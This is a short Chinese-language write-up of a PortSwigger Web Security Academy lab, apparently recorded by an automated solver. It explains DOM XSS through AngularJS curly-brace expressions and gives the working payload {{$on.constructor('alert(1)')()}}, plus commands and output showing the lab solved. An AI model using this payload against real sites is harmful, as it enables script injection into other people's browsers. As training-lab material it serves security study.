---
title: "lab-angularjs-expression"
links:
  - target: xss-context-family
    relation: evidences
  - target: dom-xss-family
    relation: evidences
---

# lab-angularjs-expression

> evidences: [[xss-context-family]], [[dom-xss-family]]

- 题面:DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded(/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
- 实例:https://0a29001a04c446ed818b166900c400ea.web-security-academy.net
- slug:请求 slug 即真 slug(见下 lab_id)
- 判定目标:AngularJS 表达式执行 `alert()`;状态:**solved**(alert 实发 + solved_check true)

## 关键步

1. 页面 `<head>` 载 `/resources/js/angular_1-7-7.js`,`<body ng-app>`;搜索词在 `/` 原样反射进 `<h1>`
   (`0 search results for '…'`),尖括号/双引号被 HTML 编码,但花括号不受影响。
2. 面:Angular 对 ng-app 范围内的 DOM 编译 `{{ }}` 表达式——角括号被编码不碍事,花括号求值面直接可用。
3. payload:`/?search={{$on.constructor('alert(1)')()}}`(URL 编码 `$`→%24、`{`→%7B、`}`→%7D)。

## 证据摘录

```
lab_alert "https://0a29001a04c446ed818b166900c400ea.web-security-academy.net/?search=%7B%7B%24on.constructor('alert(1)')()%7D%7D" --settle-ms 3000
 -> {"alerts":["alert:1","alert:1"],"fired":true}
solved_check "https://0a29001a04c446ed818b166900c400ea.web-security-academy.net/" --jar /tmp/b15-jar1.json
 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch 7DD0E73FE7CD3372360932722C0DFA1B3D73637170C9107AB1FB90C1AE2B4AE1 --widget-source /web-security/cross-site-scripting/dom-based/lab-angularjs-expression --jar /tmp/b15-jar1.json
lab_alert "<inst>/?search=%7B%7B%24on.constructor('alert(1)')()%7D%7D" --settle-ms 3000
solved_check "<inst>/" --jar /tmp/b15-jar1.json
```
